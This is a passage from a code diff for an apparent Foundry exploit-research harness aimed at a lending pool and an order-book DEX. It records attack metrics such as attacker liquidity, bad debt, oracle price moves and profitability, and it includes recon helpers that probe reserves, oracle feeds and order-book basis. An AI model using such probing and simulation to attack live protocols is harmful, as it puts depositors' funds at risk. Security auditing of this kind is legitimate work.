+        json = vm.serializeUint(key, "premiumBps", m.premiumBps);
+        json = vm.serializeUint(key, "edgeRequiredBps", m.edgeRequiredBps);
+        json = vm.serializeInt(key, "borrowPowerInflationBase", m.borrowPowerInflationBase);
+        json = vm.serializeInt(key, "maxNetBase", m.maxNetBase);
+        json = vm.serializeUint(key, "breakevenLtvBps", m.breakevenLtvBps);
+        json = vm.serializeUint(key, "liquidationThresholdBps", m.liquidationThresholdBps);
+        json = vm.serializeInt(key, "badDebtBase", m.badDebtBase);
+        json = vm.serializeUint(key, "attackerLiquidBase", m.attackerLiquidBase);
+        json = vm.serializeUint(key, "seededBase", m.seededBase);
+        json = vm.serializeUint(key, "zeroSeed", m.zeroSeed ? 1 : 0);
+        json = vm.serializeUint(key, "shortfallFlashAsset", m.shortfallFlashAsset);
+        json = vm.serializeUint(key, "shortfallBase", m.shortfallBase);
+        json = vm.serializeUint(key, "oracleRereadCount", m.oracleRereadCount);
+        json = vm.serializeUint(key, "oracleMoveBps", _moveBps(m.collateralOracleBefore, m.collateralOracleAfter));
+        json = vm.serializeUint(key, "dexAskMoveBps", _moveBps(m.bestAskBefore, m.bestAskAfter));
+        json = vm.serializeUint(key, "dexBidMoveBps", _moveBps(m.bestBidBefore, m.bestBidAfter));
+        json = vm.serializeUint(key, "profitable", _profitable(m) ? 1 : 0);
+        vm.writeJson(json, string.concat("results/", name, "-", vm.toString(amount), ".json"));
+    }
+
+    // ─────────────────────────────────────────────────────────────────────────────
+    // Recon helpers
+    // ─────────────────────────────────────────────────────────────────────────────
+
+    function _logReserve(address asset) internal view {
+        ReserveData memory r = ISomniaLendPool(POOL).getReserveData(asset);
+        address source = IAaveOracle(ORACLE).getSourceOfAsset(asset);
+        console2.log("--- reserve", asset);
+        console2.log("  symbol", IERC20(asset).symbol());
+        console2.log("  decimals", IERC20(asset).decimals());
+        console2.log("  aToken", r.aTokenAddress);
+        console2.log("  variableDebtToken", r.variableDebtTokenAddress);
+        console2.log("  aToken cash", IERC20(asset).balanceOf(r.aTokenAddress));
+        console2.log("  debt supply", IERC20(r.variableDebtTokenAddress).totalSupply());
+        console2.log("  config raw", r.configuration.data);
+        console2.log("  oracle price", IAaveOracle(ORACLE).getAssetPrice(asset));
+        console2.log("  source", source);
+        console2.log("  source code size", source.code.length);
+        if (source != address(0)) {
+            console2.log("  source impl", address(uint160(uint256(vm.load(source, EIP1967_IMPLEMENTATION)))));
+            (bool ok, bytes memory data) = source.staticcall(abi.encodeWithSignature("latestRoundData()"));
+            if (ok && data.length >= 160) {
+                (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt,) =
+                    abi.decode(data, (uint80, int256, uint256, uint256, uint80));
+                console2.log("  feed round", roundId);
+                console2.log("  feed answer", answer);
+                console2.log("  feed startedAt", startedAt);
+                console2.log("  feed updatedAt", updatedAt);
+                console2.log("  chain timestamp", block.timestamp);
+            }
+        }
+    }
+
+    function _logMarket(string memory label, address pool) internal view {
+        (address base, address quote, uint256 makerFee, uint256 takerFee, uint256 tick, uint256 minQty, uint256 lot) =
+            IDreamDexSpotPool(pool).getPoolParams();
+        console2.log("--- market", label);
+        console2.log("  pool", pool);
+        console2.log("  base", base);
+        console2.log("  quote", quote);
+        console2.log("  maker fee bps*1k", makerFee);
+        console2.log("  taker fee bps*1k", takerFee);
+        console2.log("  tick", tick);
+        console2.log("  min quantity", minQty);
+        console2.log("  lot", lot);
+        console2.log("  best bid", _best(pool, true));
+        console2.log("  best ask", _best(pool, false));
+    }
+
+    /// @notice Real, quote-backed basis: ask what the CLOB would pull for one minimum lot on the
+    ///         bid side, then value both legs with the Pool's own oracle. Positive basis means the
+    ///         protocol values the purchased collateral above what the CLOB charges for it.
+    function _logBasis(string memory label, address pool) internal view {
+        (address base, address quote,,,, uint256 minQty,) = IDreamDexSpotPool(pool).getPoolParams();
+        uint256 ask = _best(pool, false);
+        uint256 bid = _best(pool, true);
+        console2.log("--- basis", label);
+        console2.log("  base", base);
+        console2.log("  quote", quote);
+        if (ask > 0 && minQty > 0) {
+            (address input, uint256 required,) =
+                IDreamDexSpotPool(pool).getAutoPullRequirement(address(this), true, ask, minQty, 0);
+            if (input == quote && required > 0) {
+                int256 edge = _edgeBps(base, quote, minQty, required);
+                console2.log("  BUY 1 minQty at ask: quote cost", required);
+                console2.log("  BUY static basis bps (oracle value vs cost)", edge);
+            }
+        }
+        if (bid > 0 && minQty > 0) {
+            (address input2, uint256 required2,) =
+                IDreamDexSpotPool(pool).getAutoPullRequirement(address(this), false, bid, minQty, 0);
+            if (input2 == base && required2 > 0) {
+                int256 edge2 = _edgeBps(base, quote, required2, minQty);
+                console2.log("  SELL 1 minQty at bid: base required", required2);
+                console2.log("  SELL static basis bps (proceeds vs oracle value)", edge2);
+            }
+        }
+    }
+
+    /// @dev Signed basis in bps between the oracle's value of `baseAmount` of `base` and the
+    ///      oracle's value of `quoteAmount` of `quote`, both in the Pool's base currency.
+    function _edgeBps(address base, address quote, uint256 baseAmount, uint256 quoteAmount)
+        internal
+        view
+        returns (int256)
+    {
+        uint256 baseValue = (baseAmount * IAaveOracle(ORACLE).getAssetPrice(base)) / (10 ** IERC20(base).decimals());
+        uint256 quoteValue = (quoteAmount * IAaveOracle(ORACLE).getAssetPrice(quote)) / (10 ** IERC20(quote).decimals());
+        if (quoteValue == 0) return 0;
+        return int256((baseValue * 10_000) / quoteValue) - 10_000;
+    }
+
+    function _best(address pool, bool isBid) internal view returns (uint256) {
+        IDreamDexSpotPool.BookLevel[] memory levels = IDreamDexSpotPool(pool).getBookLevels(isBid, 1);
+        return levels.length == 0 ? 0 : levels[0].price;
     }
 }
